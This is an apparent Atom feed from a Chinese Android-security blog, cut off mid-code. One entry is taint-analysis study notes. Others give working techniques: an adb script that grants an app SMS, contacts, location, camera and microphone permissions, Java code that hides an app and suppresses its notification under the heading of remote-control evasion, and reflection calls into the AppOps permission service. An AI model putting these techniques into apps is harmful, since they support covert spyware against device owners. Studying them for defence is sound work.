<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clicker&#39;s blogs</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-03-10T07:15:43.652Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>clicker</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>污点分析之apk(一)</title>
    <link href="http://yoursite.com/2021/03/09/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E4%B9%8Bapk-%E4%B8%80/"/>
    <id>http://yoursite.com/2021/03/09/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E4%B9%8Bapk-%E4%B8%80/</id>
    <published>2021-03-09T05:52:57.000Z</published>
    <updated>2021-03-10T07:15:43.652Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇学习笔记。</p><p><strong>目标</strong>：借助或参考已有的分析框架，实现一个自动化检测数据泄露，或跟踪数据流向的工具。</p><p><strong>思路：</strong>先学习一下静态污点分析的技术原理，再找一些目前已有的分析框架，看是否能为我所用，在此基础上二次开发。</p><h3 id="1-了解污点分析"><a href="#1-了解污点分析" class="headerlink" title="1. 了解污点分析"></a>1. 了解污点分析</h3><p>首先，了解几个概念：</p><p>数据流分析：获取数据如何沿着程序执行路径流动的分析过程；</p><p>控制流分析：可以理解为程序流程图的变形，隐去了处理逻辑，着重强调控制程序跳转的节点；</p><p>方法调用图（call graph，即CG）：方法调用图则着重强调程序流程中方法间的调用逻辑。</p><p>污点分析：是一项跟踪并分析污点信息在程序中流动的技术。可以抽象为一个三元组&lt;source, sink, sanitizers&gt;形式，source即为污染源，代表程序的敏感数据或引入的不受信任的数据；sink为污点汇聚点，代表直接产生安全敏感操作，或向外发送隐私数据；sanitizer即无害化处理，表示污染源数据通过一些操作解除了其危害性，如对发送出去的数据做了加密处理或对引入的数据做了安全校验。</p><p>污点分析的过程就是先确定程序中的source点，分析程序中由source点标记的数据的传播过程，判断其是否经过无害化处理，最后，在sink点检测关键操作是否受到source点的影响。</p><p>如：</p><blockquote><p>……</p><p>scanf(“”%d, &amp;x);    // source，外部输入的变量x标记为污染源</p><p>……</p><p>y  =  x  +  1;      // y被污染，加入source</p><p>x = 0;                // x被重新赋值，视为未污染的，将x移出source</p><p>while(i &gt; y){      // sink，需要在此检查循环是否受y的影响</p><p>……</p><p>}</p></blockquote><p>上述示例为source点通过数据依赖关系传播，为显式信息流分析。还有一种通过控制依赖关系传播的方式，称为隐式信息流分析，如：</p><blockquote><p>scanf(“”%d, &amp;x);    // source</p><p>if(x &gt; 0)</p><p>​    y = 1;              </p><p>else</p><p>​    y = 0;</p><p>sink(y);             //sink</p></blockquote><p><strong>确定污染源和汇聚点的方法：</strong></p><p>（1）使用保守策略，认为所有外部输入的数据均有可能包含恶意数据，如把来自程序外部输入的数据统称为“污点数据”；</p><p>（2）根据实际需要，将特定API或重要数据标记为污染源和汇聚点；</p><p>（3）使用机器学习技术自动识别和标记污染源和汇聚点。</p><p><strong>无害化处理：</strong></p><p>无害化处理模块是指污点数据经过该模块的处理后，数据本身不再携带敏感信息或针对该数据的操作不会对系统产生危害，也就是说，带污点标记的数据在经过无害化处理后，污点标记可以被移除。</p><p><strong>污点分析原理：</strong></p><p>污点分析可以分为静态分析和动态分析，静态分析不需要运行程序，动态分析则是通过在程序运行中监控程序的污点数据的传播来检测数据能否从污染源传播到汇聚点。我们着重了解静态污点分析。</p><p>静态污点分析的分析对象是程序源码或中间表示（如smali,soot的Jimple）。</p><p>首先，解析程序，构建程序调用图、控制流图等辅助分析；</p><p>然后，根据过程内和过程间的不同特征进行具体的数据传播分析，显示分析的传播方式包括<strong>直接赋值，函数调用，通过引用或指针传播</strong>，标记Source和Sink，最后再根据业务需求制定规则，分析得出最终结果。</p><h3 id="2-污点分析实现原理"><a href="#2-污点分析实现原理" class="headerlink" title="2. 污点分析实现原理"></a>2. 污点分析实现原理</h3><h4 id="2-1-显式分析"><a href="#2-1-显式分析" class="headerlink" title="2.1 显式分析"></a>2.1 显式分析</h4><p>显式分析通常是沿着程序运行的路径方向分析污点的流向，分为过程内和过程间两个阶段。</p><p>首先是过程内分析，可以理解为在一个方法内，按照一定顺序分析每一条语句和指令，从而得到污点信息的流向。</p><p><strong>分析过程：</strong></p><p>（1）<em>确定如何标记source点</em>。标记Source点，通常是为变量加一个boolean类型的标签，标记变量是否被污染。复杂一点的化，还可以标记变量的污染信息来自哪个source。若不使用标签，可以使用栈或队列来记录被污染的变量，从来跟踪污染信息的流向。</p><p>（2）<em>分析语句</em>。主要关注赋值、控制语句以及方法调用语句（有时表述为过程调用）三种语句。</p><ul><li>赋值语句：<ul><li><code>a = b</code>这样的简单赋值语句，左端变量与右端变量污染状态相同；</li><li><code>a = b + c</code>这样的二元操作赋值语句，通常认为右端的操作数只要有一个是被污染的，则左端变量是被污染的；</li><li>对于数组相关的赋值，如果可以确定数组下标的取值或范围，则可以精确判断数组中哪些元素被污染，否则认为整个数组被污染。</li><li>对于包含字段或者包含指针操作的赋值语句，常常需要用到指向分析的分析结果。</li></ul></li><li>控制语句：<ul><li>对于条件控制转移语句，首先判断路径条件可能是包含对污点数据的限制，分析时需要识别这些条件，以判断这些条件是否足够保证程序不会收到攻击，如果可以，则将相应的变量标记为未污染。</li><li>对于循环语句，通常规定循环遍历取值的界限不会收到污染数据的影响，如<code>for(i = 1; i &lt; k; i++){}</code>中，k应是未污染的。</li></ul></li><li>方法调用语句：这里与过程间分析配合，使用了构建过程摘要的方法，描述怎样改变与该过程相关的变量的污染状态，以及对哪些变量的污染状态进行检测。这些变量可以是过程使用的参数、参数的字段或者过程的返回值等。例如在语句 <code>flag = obj.method(str);</code> 中，str 是污染的，那么通过过程间的分析，将变量 obj 的字段 str 标记为污染的，而记录方法的返回值的变量 flag 标记为未污染的。实际分析时，可以对已经分析过的方法构建摘要。例如前面的语句，其摘要描述为：方法 method 的参数污染状态决定其接收对象的实例域 str 的污染状态，并且它的返回值是未受污染的。那么下一次分析时，就可以直接通过摘要进行分析。</li></ul><p>（3）<em>遍历语句</em>。一般情况下，常常使用流敏感的方式或者路径敏感的方式进行遍历，并分析过程中的代码。如果使用流敏感的方式，可以通过对不同路径上的分析结果进行汇集，以发现程序中的数据净化规则。如果使用路径敏感的分析方式，则需要关注路径条件，如果路径条件中涉及对污染变量取值的限制，可认为路径条件对污染数据进行了净化，还可以将分析路径条件对污染数据的限制进行记录，如果在一条程序路径上，这些限制足够保证数据不会被攻击者利用，就可以将相应的变量标记为未污染的。</p><p>其次是过程间分析，是在过程内分析的基础上，根据调用图中描述的调用关系，自底向上进行整体分析。</p><h4 id="2-2-隐式分析"><a href="#2-2-隐式分析" class="headerlink" title="2.2 隐式分析"></a>2.2 隐式分析</h4><p>隐式分析，即基于控制依赖关系进行分析。首先，根据程序控制流图和方法调用图，根据需要优先考虑与Wource和Sink相关的程序语句构造程序依赖图（可以看作程序流程图的变形，着重强调条件判断和分支语句），根据污点分析规则，检测sink点处的敏感操作是否依赖于Source点。</p><h3 id="3-污点分析框架"><a href="#3-污点分析框架" class="headerlink" title="3. 污点分析框架"></a>3. 污点分析框架</h3><h4 id="3-1-FlowDroid-框架"><a href="#3-1-FlowDroid-框架" class="headerlink" title="3.1 FlowDroid 框架"></a>3.1 FlowDroid 框架</h4><p>FlowDroid是一款基于Soot开发的对Android应用进行污点分析的框架。Soot是一款强大的Java代码优化分析框架，通过将Java字节码转换为其独有的中间表示，进行控制流分析、调用图分析等。FlowDroid也一直在维护，Github地址为：<a href="https://github.com/secure-software-engineering/FlowDroid" target="_blank" rel="noopener">https://github.com/secure-software-engineering/FlowDroid</a> 。</p><p>如果不需要修改源码，直接使用的话，可以<a href="https://github.com/secure-software-engineering/FlowDroid/releases" target="_blank" rel="noopener">在这里</a>下载soot-infoflow-android-classes.jar和soot-infoflow-classes.jar两个文件，<a href="https://soot-build.cs.uni-paderborn.de/public/origin/master/soot/soot-master/" target="_blank" rel="noopener">在这里</a>下载最新版的sootclasses-trunk-jar-with-dependencies.jar，将jar包导入工程就可以使用FlowDroid进行调用图、数据流分析了。具体接口这里暂不赘述。</p><p>PS：如果build失败的话，可能是缺少依赖的包了，下载trove4j.jar导入工程即可。</p><h4 id="3-2-PATDroid"><a href="#3-2-PATDroid" class="headerlink" title="3.2 PATDroid"></a>3.2 PATDroid</h4><p>Github地址：<a href="https://github.com/mingyuan-xia/PATDroid" target="_blank" rel="noopener">https://github.com/mingyuan-xia/PATDroid</a></p><p>PATDroid框架能够分析Android应用程序和系统本身。通过解析smali语句，分析程序控制流等，也具备污点分析能力。</p><p>与FlowDroid相比，代码量较少易于阅读，方便二次开发。另外，PATDroid直接使用dexlib2工具提取dex中的类、方法、变量等信息，而FlowDroid则需要将dex字节码转换为中间语言，在进行分析，开销较大。</p><p>下一章研究下PATDroid框架的具体实现。</p><hr><p><strong>参考文献：</strong></p><p>[1] <a href="https://www.jianshu.com/p/dc30dc61acd6" target="_blank" rel="noopener">https://www.jianshu.com/p/dc30dc61acd6</a></p><p>[2] <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.5_taint_analysis.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.5_taint_analysis.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一篇学习笔记。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;目标&lt;/strong&gt;：借助或参考已有的分析框架，实现一个自动化检测数据泄露，或跟踪数据流向的工具。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路：&lt;/strong&gt;先学习一下静态污点分析的技术原理，再找一些目前已有的分析框架，看是否
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="http://yoursite.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android绕过授权方法实践(三)</title>
    <link href="http://yoursite.com/2021/01/14/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5-%E4%B8%89/"/>
    <id>http://yoursite.com/2021/01/14/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5-%E4%B8%89/</id>
    <published>2021-01-14T02:31:42.000Z</published>
    <updated>2021-01-28T09:15:55.205Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p>找到一个方法，在PC端adb shell中执行<code>pm grant com.android.xxx android.permission.READ_CONTACTS</code>就可以授权成功，无需root。</p><p>实验结果如下表所示：</p><table><thead><tr><th align="center">设备</th><th align="center">系统版本</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">Pixel/Pixel 2</td><td align="center">Android 10</td><td align="center">成功</td></tr><tr><td align="center">一加6</td><td align="center">Android 10</td><td align="center">成功</td></tr><tr><td align="center">小米max 2</td><td align="center">Android 7.1</td><td align="center">失败</td></tr></tbody></table><p>小米手机由于厂商自定义了一系列安全措施，比原生系统更严格一些。</p><p>以Pixel为例，介绍获取权限的过程：</p><p>将设备的开发者选项打开，进入USB调试状态，连接至PC端。</p><p>然后，执行命令：</p><p><code>adb push getPermission.sh /storage/emulated/0/Download</code>,</p><p>将shell脚本<code>getPermission.sh</code>拷贝至手机Download目录下。</p><p>脚本内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> #!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.READ_SMS</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.READ_CALENDAR</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.READ_CALL_LOG</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.ACCESS_FINE_LOCATION</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.RECEIVE_SMS</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.READ_PHONE_STATE</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.SEND_SMS</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.CALL_PHONE</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.WRITE_CONTACTS</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.CAMERA</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.WRITE_CALENDAR</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.RECORD_AUDIO</span><br><span class="line"></span><br><span class="line">pm grant com.android.xxx android.permission.READ_CONTACTS</span><br></pre></td></tr></table></figure><p>在cmd中执行命令：</p><blockquote><p>adb shell</p><p>cd /storage/emulated/0/Download</p><p>sh getPermission.sh</p></blockquote><p>到设置中查看，应用已被授予权限。</p><hr><p>另外还尝试了在手机中安装终端Termux，在终端中执行pm命令，但是出现报错：</p><blockquote><p>cmd: Failure calling service package: Failed transaction(2147483646)</p></blockquote><p>参考<a href="https://forum.xda-developers.com/t/terminal-failure-calling-service-activity-android-8-0-issue.3709350/" target="_blank" rel="noopener">这里</a>的解释，需要开放selinux许可。</p><p>操作方法参考<a href="https://androidmore.com/set-selinux-permissive-android/#:~:text=Set%20SELinux%20Permissive%20Using%20the%20App%201%20Open,screen.%204%20On%20the%20homescreen%2C%20simply%20tap%20" target="_blank" rel="noopener">这里</a>，需要刷入第三方Recovery，比较麻烦了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;找到一个方法，在PC端adb shell中执行&lt;code&gt;pm grant com.android.xxx android.permiss
      
    
    </summary>
    
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>远控免杀实验笔记（二）</title>
    <link href="http://yoursite.com/2021/01/08/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoursite.com/2021/01/08/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-01-08T08:27:07.000Z</published>
    <updated>2021-01-08T08:51:45.173Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p>看看“流氓应用”都是怎么隐藏起来在后台运行的，引以为戒。</p><h4 id="设置页面为透明"><a href="#设置页面为透明" class="headerlink" title="设置页面为透明"></a>设置页面为透明</h4><ol><li>在<code>AndroidManifest.xml</code>中，在需要设置为透明的activity标签中添加：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:theme=<span class="string">"@android:style/Theme.Translucent.NoTitleBar"</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>在Activity的<code>onCreate</code>方法中添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置Activity宽高</span></span><br><span class="line">Window window = getWindow();</span><br><span class="line">WindowManager.LayoutParams windowLayoutParams = window.getAttributes(); <span class="comment">// 获取对话框当前的参数值</span></span><br><span class="line">windowLayoutParams.width = <span class="number">1</span>;</span><br><span class="line">windowLayoutParams.height = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐藏界面</span></span><br><span class="line">getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);</span><br></pre></td></tr></table></figure></li></ol><h4 id="从近期任务中隐藏起来"><a href="#从近期任务中隐藏起来" class="headerlink" title="从近期任务中隐藏起来"></a>从近期任务中隐藏起来</h4><p>在启动页Activity的标签中添加配置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:excludeFromRecents=<span class="string">"true"</span></span><br></pre></td></tr></table></figure><p>虽然在近期任务中不可见了，但是清理后台还是能被清理掉。</p><h4 id="后台运行不被清理"><a href="#后台运行不被清理" class="headerlink" title="后台运行不被清理"></a>后台运行不被清理</h4><p>这个要根据手机品牌和型号来具体设置。</p><p>大体思路就是将应用加入电池优化白名单，后台清理白名单。可以参考：<a href="https://users.easemon.com/zh" target="_blank" rel="noopener">https://users.easemon.com/zh</a></p><h4 id="设置前台服务"><a href="#设置前台服务" class="headerlink" title="设置前台服务"></a>设置前台服务</h4><p>有时候需要从后台Service通过Intent启动Activity，但是从Android Q开始做了限制, 需要改为从前台Service启动Activity。</p><p>首先适配服务启动方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">startService</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">        context.startForegroundService(<span class="keyword">new</span> Intent(context, MyService<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        context.startService(<span class="keyword">new</span> Intent(context, MyService<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前台服务会在通知栏显示服务相关信息，在Service的onCreate方法中进行配置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line"></span><br><span class="line">            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);</span><br><span class="line">            NotificationChannel Channel = <span class="keyword">new</span> NotificationChannel(CHANNEL_ID, <span class="string">"Internet Service"</span>, NotificationManager.IMPORTANCE_NONE);</span><br><span class="line">            Channel.enableLights(<span class="keyword">false</span>);<span class="comment">//设置提示灯</span></span><br><span class="line">            Channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);</span><br><span class="line">            manager.createNotificationChannel(Channel);</span><br><span class="line"></span><br><span class="line">            Notification notification = <span class="keyword">new</span> Notification.Builder(<span class="keyword">this</span>)</span><br><span class="line">                    .setChannelId(CHANNEL_ID)</span><br><span class="line">                    .setContentTitle(<span class="string">""</span>)<span class="comment">//标题</span></span><br><span class="line"><span class="comment">//                    .setContentText("Internet Service")//内容</span></span><br><span class="line">                    .setWhen(System.currentTimeMillis())</span><br><span class="line">                    .setSmallIcon(R.mipmap.ic_launcher)<span class="comment">//小图标一定需要设置,否则会报错(如果不设置它启动服务前台化不会报错,但是你会发现这个通知不会启动),如果是普通通知,不设置必然报错</span></span><br><span class="line">                    .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher))</span><br><span class="line">                    .build();</span><br><span class="line">            startForeground(<span class="number">1</span>, notification);<span class="comment">//服务前台化只能使用startForeground()方法,不能使用 notificationManager.notify(1,notification); 这个只是启动通知使用的,使用这个方法你只需要等待几秒就会发现报错了</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>怎么隐藏此通知呢，在<code>onStartCommand</code>方法中将通知移除即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stopForeground(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看看“流氓应用”都是怎么隐藏起来在后台运行的，引以为戒。&lt;/p&gt;
&lt;h4 id=&quot;设置页面为透
      
    
    </summary>
    
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android绕过授权方法实践(二)</title>
    <link href="http://yoursite.com/2021/01/07/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5-%E4%BA%8C/"/>
    <id>http://yoursite.com/2021/01/07/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5-%E4%BA%8C/</id>
    <published>2021-01-07T05:36:27.000Z</published>
    <updated>2021-01-08T09:09:05.439Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p>上回说到我们考虑两种方法：</p><p>（1）通过反射，调用PackageManagerService中的设置权限的方法，直接传入权限和应用信息，对应用授权；</p><p>（2）直接修改uid:修改 /data/system/packages.list, /data/system/packages.xml等存储应用运行信息的文件</p><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>参考了在<a href="https://sleepydogyp.github.io/2020/12/30/Android%E7%BB%95%E8%BF%87%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5/#more" target="_blank" rel="noopener">上篇</a>中引用的引用文献【1】的大佬的思路，这里也实现了大佬文章中的方法</p><p>该方法是反射得到<code>IAppOpsService</code>对象，调用其setMode方法，设置权限。<code>IAppOpsService</code>是Android自带的权限管理工具，通过<code>setMode()</code>方法设置权限。</p><blockquote><p>IBinder b = ServiceManager.getService(Context.APP_OPS_SERVICE);</p><p> IAppOpsService service = IAppOpsService.Stub.asInterface(b);</p><p> service.setMode(…)</p></blockquote><p>直接上代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IBinder b = ServiceManager.getService(Context.APP_OPS_SERVICE);</span></span><br><span class="line">Class class_serviceManager = Class.forName(<span class="string">"android.os.ServiceManager"</span>);</span><br><span class="line">Method method_getService = class_serviceManager.getMethod(<span class="string">"getService"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Object result_IBinder = method_getService.invoke(<span class="keyword">null</span>, <span class="string">"appops"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// IAppOpsService service = IAppOpsService.Stub.asInterface(b);</span></span><br><span class="line">Class class_IAppOpsService_Stub = Class.forName(<span class="string">"com.android.internal.app.IAppOpsService$Stub"</span>);</span><br><span class="line">Method method_asInterface = class_IAppOpsService_Stub.getMethod(<span class="string">"asInterface"</span>, Class.forName(<span class="string">"android.os.IBinder"</span>));</span><br><span class="line">Object result_service = method_asInterface.invoke(<span class="keyword">null</span>, result_IBinder);</span><br><span class="line"></span><br><span class="line"><span class="comment">// service.setMode()</span></span><br><span class="line">Class class_IAppOpsService = Class.forName(<span class="string">"com.android.internal.app.IAppOpsService"</span>);</span><br><span class="line">Method method_setMode = class_IAppOpsService.getMethod(<span class="string">"setMode"</span>, <span class="keyword">int</span><span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>, <span class="title">String</span>.<span class="title">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">method_setMode.invoke(result_service, op, uid, packagename, mode);</span><br></pre></td></tr></table></figure><p>在外层套上main函数，然后打包成一个jar，放入设备。应用运行时，通过<code>adb shell</code>命令执行该jar文件。</p><p>（1）main():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">        System.out.println(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String packagename = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">int</span> uid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mode = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> op = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arg.startsWith(<span class="string">"-"</span>) &amp;&amp; arg.contains(<span class="string">"="</span>)) &#123;</span><br><span class="line">            String type = arg.substring(arg.indexOf(<span class="string">"-"</span>) + <span class="number">1</span>, arg.indexOf(<span class="string">"="</span>)).trim();</span><br><span class="line">            String value = arg.substring(arg.indexOf(<span class="string">"="</span>) + <span class="number">1</span>).trim();</span><br><span class="line">            <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"packagename"</span>:</span><br><span class="line">                    packagename = value;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"mode"</span>:</span><br><span class="line">                    mode = Integer.parseInt(value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"op"</span>:</span><br><span class="line">                    op = Integer.parseInt(value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"uid"</span>:</span><br><span class="line">                    uid = Integer.parseInt(value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packagename == <span class="keyword">null</span> || packagename.isEmpty() || op == -<span class="number">1</span> || mode == -<span class="number">1</span>) &#123;</span><br><span class="line">        System.out.println(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    